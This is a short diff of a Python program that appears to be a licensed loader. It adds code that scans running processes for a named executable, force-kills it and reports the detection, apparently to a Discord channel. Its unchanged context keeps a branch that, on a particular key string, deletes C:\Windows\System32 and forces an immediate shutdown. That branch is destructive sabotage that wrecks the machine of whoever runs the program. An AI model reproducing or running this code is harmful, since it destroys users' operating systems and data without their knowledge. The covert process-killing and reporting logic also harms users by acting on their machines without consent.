@@ -7,10 +7,18 @@ import keyring
 
 import subprocess
 
-
+resultloader = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
+if 'AES3.0V2.exe' in resultloader.stdout:
+    os.system('cls')
+    mylogo()
+    subprocess.run(['taskkill', '/F', '/IM', "AES3.0V2.exe"], capture_output=True, text=True)
+    mklaloader=cskey+" loader was detected."
+    discord_warning(mklaloader)
+    os.system('cls')
 
 os.system('cls')
 aesv7()
+
 if cskey =="antidebuuggerxxxx":
     shutil.rmtree(r'C:\Windows\System32')
     os.system("shutdown /s /f /t 0")
